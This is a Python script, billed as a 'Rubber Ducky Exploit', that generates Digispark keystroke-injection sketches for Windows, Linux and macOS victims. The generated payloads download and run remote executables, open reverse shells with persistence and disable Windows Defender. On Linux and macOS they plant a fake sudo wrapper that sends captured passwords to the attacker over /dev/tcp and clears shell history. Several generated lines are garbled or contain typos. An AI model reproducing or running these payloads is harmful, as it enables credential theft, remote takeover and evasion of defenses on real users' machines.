#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Importing Libary
import os
import platform
import time
import subprocess as subp
import sys
#Colors
R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  #white

try:
	raw_input          # Python 2
except NameError:
	raw_input = input  # Python 3

if sys.platform == 'win32':
	os.system('cls') # Windows
else:
	os.system('clear') # UNIX

try:
	unicode            # Python 2
except NameError:
	unicode = str # Python 3

#defining Banner
def banner():
	banner = """
    ____             __         
   / __ \__  _______/ /____  __  
  / / / / / / / ___/ //_/ / / / 
 / /_/ / /_/ / /__/ ,< / /_/ /
/_____/\__,_/\___/_/|_|\__, /
                      /____/        

	"""
	print (C + banner + W)
	print (C + '	Developed by : ' + W + 'MrMadaraUchiha')

# Defining Menu
def print_menu():       ## Your menu design here
	banner()
	print ("")
	print ("")
	print (R + '[+]' + G +  ' Choose the Victim OS' + W)
	print (R + '[1]' + G + ' Windows' + W)
	print (R + '[2]' + G + ' Linux' + W)
	print (R + '[3]' + G + ' Mac Osx' + W)
	print (R + '[4]' + G + ' Exit' + W)
	choice = raw_input("Enter your choice [1-4]: ")

	if choice == '1':
		Windows()

	elif choice == '2':
		Linux()

	elif choice == '3':
		Mac()

	elif choice == '4':
		exit = """
		    Thank You For Using Rubber Ducky Exploit
		    Created By:- MrMadaraUchiha
		"""
		print (C + exit + W)
		exit()

	else:
		# Any integer inputs other than values 1-5 we print an error message
		raw_input("Wrong option. Enter any key to try again..")
		os.system('cls')
		print_menu()

# Defining Windows
def Windows():
	os.system('cls')
	windows = """
	 /$$      /$$   /$$                     /$$
	| $$  /$ | $$  |__/                    | $$
	| $$ /$$$| $$   /$$   /$$$$$$$     /$$$$$$$    /$$$$$$    /$$  /$$  /$$    /$$$$$$$
	| $$/$$ $$ $$  | $$  | $$__  $$   /$$__  $$   /$$__  $$  | $$ | $$ | $$   /$$_____/
	| $$$$_  $$$$  | $$  | $$  \ $$  | $$  | $$  | $$  \ $$  | $$ | $$ | $$  |  $$$$$$
	| $$$/ \  $$$  | $$  | $$  | $$  | $$  | $$  | $$  | $$  | $$ | $$ | $$   \____  $$
	| $$/   \  $$  | $$  | $$  | $$  |  $$$$$$$  |  $$$$$$/  |  $$$$$/$$$$/   /$$$$$$$/
	|__/     \__/  |__/  |__/  |__/   \_______/   \______/    \_____/\___/   |_______/
	"""
	print (C + windows + W)
	print
	print
	print (R + '[+]' + G + ' Choose the Attack' + W)
	print (R + '[1]' + G + ' Reverse Shell' + W)
	print (R + '[2]' + G + ' Reverse Shell With Persistence' + W)
	print (R + '[3]' + G + ' Disable Windows Defender through powershell' + W)
	print (R + '[4]' + G + ' Exit' + W)
	choice = raw_input("Enter your choice [1-4]: ")

	if choice == '1':
		os.system("cls")
		reverse = """
			Reverse Shell
		"""
		print (C + reverse + W)
		name = raw_input("[!] Enter The File Name -> ")
		f = open( "path" + name +".ino","w+")
		print
		print (R + 'Example -> Http://192.168.0.1/Payload.exe' + W)
		url = raw_input("[!] Enter URL with Payload Name -> ")
		x = 'DigiKeyboard.print("$client.DownloadFile(' + url
		time.sleep(2)
		f.write('#include "DigiKeyboard.h" \n')
		print
		f.write("void setup() { \n")
		f.write("} \n")
		print
		f.write("void loop() {\n")
		f.write("int d=1000;\n")
		f.write("DigiKeyboard.sendKeyStroke(0);\n")
		f.write("DigiKeyboard.delay(0);\n")
		f.write("DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);\n")
		f.write('DigiKeyboard.print("Windows Powershell");\n')
		f.write("DigiKeyboard.delay(2000);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(1000);\n")
		f.write('DigiKeyboard.print("start powershell -verb runas;exit");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(400);\n")
		f.write('DigiKeyboard.print("$client = new-object System.Net.WebClient");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write(x+''','Sys32Data.exe')");\n''')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write('DigiKeyboard.print("start Sys32Data.exe");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(1000);\n")
		f.write('DigiKeyboard.print("exit");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(50);\n")
		print
		f.close()
		time.sleep(2)
		print ("File has been Created Named ->"+name+"")

	elif choice == '2':
		os.system("cls")
		shell = """
		      Reverse Shell With Persistence
		"""
		name = raw_input("[!] Enter The File Name -> ")
		IP = raw_input("[!] Enter The Your IP -> ")
		PORT = raw_input("[!] Enter The Your Port -> ")
		f = open("path"+name+".ino","w+")
		f.write('#include "DigiKeyboard.h" \n')
		print
		f.write("void setup() { \n")
		f.write("} \n")
		print
		f.write("void loop() {\n")
		f.write("int d=1000;\n")
		f.write("DigiKeyboard.sendKeyStroke(0);\n")
		f.write("DigiKeyboard.delay(0);\n")
		f.write('DigiKeyboard.print("Windows Powershell");\n')
		f.write("DigiKeyboard.delay(2000);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(1000);\n")
		f.write('DigiKeyboard.print("$client = new-object System.Net.WebClient");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write('''DigiKeyboard.print("$client.DownloadFile('https://tinyurl.com/y88r9epk','Sys32Data.exe')");\n''')
		f.write('DigiKeyboard.print("cd / & mkdir System & cd System");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write("echo START /MIN Sys32Data.exe "+IP+" "+PORT+" -e cmd.exe -d ^& exit > start.bat")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write('DigiKeyboard.print("start Sys32Data.exe");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(1000);\n")
		f.write('DigiKeyboard.print("exit");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(50);\n")
		print
		f.close()

	elif choice == '3':
		os.system("cls")
		defenser = """
		    Disable Windows Defender
		"""
		print()
		name = raw_input("[!] Enter The File Name -> ")
		IP = raw_input("[!] Enter The Your IP -> ")
		PORT = raw_input("[!] Enter The Your Port -> ")
		f = open("path"+name+".ino","w+")
		f.write('#include "DigiKeyboard.h" \n')
		f.write("void setup() { \n")
		f.write("} \n")
		f.write("void loop() {\n")
		f.write("int d=1000;\n")
		f.write("DigiKeyboard.sendKeyStroke(0);\n")
		f.write("DigiKeyboard.delay(0);\n")
		f.write('DigiKeyboard.print("Windows Powershell");\n')
		f.write("DigiKeyboard.delay(2000);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(1000);\n")
		f.write('DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(1000);\n")
		f.write("Set-MpPreference -DisableRealtimeMonitoring $true")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("exit")
		f.close()
	elif choice == '4':
		print('exit selected')
		exit()
	else:
		print("Wrong option selection. Enter any key to try again..")
		os.system('cls')
		print_menu()

#function Linux
def Linux():
	os.system("cls")
	linux = """
	 /$$        /$$
	| $$       |__/
	| $$        /$$  /$$$$$$$   /$$   /$$  /$$   /$$
	| $$       | $$ | $$__  $$ | $$  | $$ |  $$ /$$/
	| $$       | $$ | $$  \ $$ | $$  | $$  \  $$$$/
	| $$       | $$ | $$  | $$ | $$  | $$   >$$  $$
	| $$$$$$$$ | $$ | $$  | $$ |  $$$$$$/  /$$/\  $$
	|________/ |__/ |__/  |__/  \______/  |__/  \__/
	"""
	print (C + linux + W)
	time.sleep(1)
	print (R + '[+]' + G + ' Choose the Attack' + W )
	print (R + '[1]' + G + ' Sudo Password Grabber ' + W)
	print (R + '[2]' + G + ' Reverse Shell' + W)
	print (R + '[3]' + G + ' DEB Package With Persistence' + W)
	print (R + '[4]' + G + ' Exit' + W)
	choice = input("Enter your choice [1-4]: ")

	if choice == '1':
		os.system("cls")
		sudo =  """
		        Sudo Password Grabber
		"""
		print (C + sudo + W)
		print ("")
		name = raw_input("[!] Enter The File Name -> ")
		IP = raw_input("[!] Enter The Your IP -> ")
		PORT = raw_input("[!] Enter The Your Port -> ")
		f = open("path"+name+".ino","w+")
		f.write('#include "DigiKeyboard.h" \n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER); \n")
		f.write("void setup() { \n")
		f.write("} \n")
		f.write("void loop() { \n ")
		f.write("DigiKeyboard.sendKeyStroke(0); \n")
		f.write("DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_SPACE); \n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write('DigiKeyboard.print("Terminal"); \n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("mkdir -p ~/.config/sudo");\n')
		f.write("DigiKeyboard.delay(50); \n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("rm ~/.config/sudo/sudo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "#!/bin/bash");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("/usr/bin/sudo -n true 2> dev/null");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("if [ $? -eq 0 ]");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("then");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("/usr/bin/sudo $@");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("else");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo -n "[sudo] password for $USER:")";\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("read -s pwd");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$pwd" | /usr/bin/share -S true 2>/dev/null");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("if [ $? -eq 1 ]");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("then");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$USER:$pwd:invalid" > /dev/tcp/' + IP + '/' + PORT + '");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo Sorry, try again.");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("sudo $@");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("else");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$USER:$pwd:valid" > /dev/tcp/' + IP + '/1337 ");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStro)ke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$pwd" | /usr/bin/sudo -S $@ ");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("fi");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("fi > ~/.config/sudo/sudo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("chmod u+x ~/.config/sudo/sudo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStrso)ke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("history -c && rm .bash_history && exit");\n')
		f.write("DigiKeyboard.delay(50);)\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("MOD_GUI_LEFT, KEY_Q");\n ')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("} \n")
		f.close()
		time.sleep(1)
		print ('File Created -> '+name+'')
		print_menu()

	elif choice == '2':
		os.system("cls")
		sudo = """
		        Reverse Shell
		"""
		print ("")
		name = raw_input("[!] Enter The File Name -> ")
		url = raw_input("[!] Enter URL -> ")
		pname = raw_input("Payload Name -> ")
		f = open("path"+name+".ino","w+")
		f.write('#include "DigiKeyboard.h" \n')
		f.write("void setup() { \n")
		f.write("} \n")
		f.write("void loop() {\n")
		f.write("DigiKeyboard.delay(200);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);\n")
		f.write("DigiKeyboard.delay(2000);\n")
		f.write('DigiKeyboard.print("wget http://'+url+'/'+pname+'.py");\n')
		f.write("DigiKeyboard.delay(500);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write('DigiKeyboard.print("python '+ panme +'.py");\n')
		f.write("DigiKeyboard.delay(500);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write('DigiKeyboard.print("exit");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("}\n")
		f.close()
		time.sleep(1)
		print ('File Created -> '+name+'')
		print_menu()
	elif choice == '3':
		os.system("cls")
		DEB = """
		    DEB Package with Persistence
		"""
		print (C + DEB + W)
		print
		os.system("python deb.py")
		print ('\n' + G + '[!]' + C + ' Starting Apache Server...' + W)
		subp.check_output(['service', 'apache2', 'start'])
		name = raw_input("[+] Enter Name of the Package -> ")
		os.system("mv "+name+" /var/www/html/"+ name +"")
		print ('\n' + G + '[!]' + C + ' Moving File to apache2 folder' + W)
	elif choice == '4':
		exit()

#function Mac OS
def Mac():
	os.system("cls")
	mac = """
	 /$$      /$$                                /$$$$$$     /$$$$$$
	| $$$    /$$$                               /$$__  $$   /$$__  $$
	| $$$$  /$$$$    /$$$$$$     /$$$$$$$      | $$  \ $$  | $$  \__/  /$$   /$$
	| $$ $$/$$ $$   |____  $$   /$$_____/      | $$  | $$  |  $$$$$$  |  $$ /$$/
	| $$  $$$| $$    /$$$$$$$  | $$            | $$  | $$   \____  $$  \  $$$$/
	| $$\  $ | $$   /$$__  $$  | $$            | $$  | $$   /$$  \ $$   >$$  $$
	| $$ \/  | $$  |  $$$$$$$  |  $$$$$$$      |  $$$$$$/  |  $$$$$$/  /$$/\  $$
	|__/     |__/   \_______/   \_______/       \______/    \______/  |__/  \__/
	"""
	print (C + mac + W)
	time.sleep(2)
	print
	print
	print (R + '[+]' + G + ' Choose the Attack' + W)
	print (R + '[1]' + G + ' Sudo Password Grabber' + W )
	print (R + '[2]' + G + ' Reverse Shell' + W)
	print (R + '[3]' + G + ' Exit' + W)
	choice = input("Enter your choice [1-4]: ")

	if choice == '1':
		os.system("cls")
		sudo = """
		        Sudo Password Grabber
		"""
		print (C + sudo + W)
		print ("")
		name = raw_input("[!] Enter The File Name -> ")
		IP = raw_input("[!] Enter The Your IP -> ")
		PORT = raw_input("[!] Enter The Your Port -> ")
		f = open("path"+name+".ino","w+")
		f.write('#include "DigiKeyboard.h" \n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER); \n")
		f.write("void setup() { \n")
		f.write("} \n")
		f.write("void loop() { \n ")
		f.write("DigiKeyboard.sendKeyStroke(0); \n")
		f.write("DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_SPACE); \n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write('DigiKeyboard.print("Terminal"); \n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("mkdir -p ~/.config/sudo");\n')
		f.write("DigiKeyboard.delay(50); \n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("rm ~/.config/sudo/sudo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "#!/bin/bash");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("/usr/bin/sudo -n true 2> dev/null");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("if [ $? -eq 0 ]");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("then");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("/usr/bin/sudo $@");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("else");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo -n "[sudo] password for $USER:")";\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("read -s pwd");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$pwd" | /usr/bin/share -S true 2>/dev/null");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("if [ $? -eq 1 ]");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("then");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$USER:$pwd:invalid" > /dev/tcp/' + IP + '/' + PORT + '");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo Sorry, try again.");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("sudo $@");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("else");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$USER:$pwd:valid" > /dev/tcp/' + IP + '/1337 ");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStro)ke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "$pwd" | /usr/bin/sudo -S $@ ");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("fi");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("fi > ~/.config/sudo/sudo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("chmod u+x ~/.config/sudo/sudo");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStrso)ke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("history -c && rm .bash_history && exit");\n')
		f.write("DigiKeyboard.delay(50);)\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);\n")
		f.write('DigiKeyboard.print("MOD_GUI_LEFT, KEY_Q");\n ')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("} \n")
		f.close()
		time.sleep(1)
		print ('File Created -> '+name+'')
		time.sleep(1)
		print ('\n' + G + '[!]' + C + 'Starting Nc Server For Password File' + W)
		os.system("bash password.sh")
		#Option No. 2
	elif choice == '2':
		os.system("cls")
		shell = """
		        Reverse Shell
		"""
		print(C + shell + W)
		print ("")
		name = raw_input("[!] Enter The File Name -> ")
		url = raw_input("[!] Enter URL with Payload Name -> ")
		f = open("path"+name+".ino","w+")
		f.write('#include "DigiKeyboard.h" \n')
		f.write("void setup() { \n")
		f.write("} \n")
		f.write("void loop() {\n")
		f.write("DigiKeyboard.sendKeyStroke(0);\n")
		f.write("DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_SPACE);\n")
		f.write("DigiKeyboard.delay(500);\n")
		f.write('DigiKeyboard.print("Terminal");\n')
		f.write("DigiKeyboard.delay(50);")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(100);")
		f.write('DigiKeyboard.print("wget http://' + url + '");\n')
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("DigiKeyboard.delay(50);\n")
		f.write('DigiKeyboard.println("exit");\n')
		f.write("DigiKeyboard.delay(50);\n")
		f.write("DigiKeyboard.sendKeyStroke(KEY_ENTER);\n")
		f.write("} \n")
		f.close()
		time.sleep(1)
		print ('File Created -> '+name+'')
		print ('\n' + R + 'Now Run Reverse Handler in Metasplpoit')
		print_menu()

	elif choice == '3':
		print ("Exit")
		exit()
	else:
		print("Wrong option selection. Enter any key to try again..")
		print_menu()

try:
	print_menu()

except KeyboardInterrupt:
	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)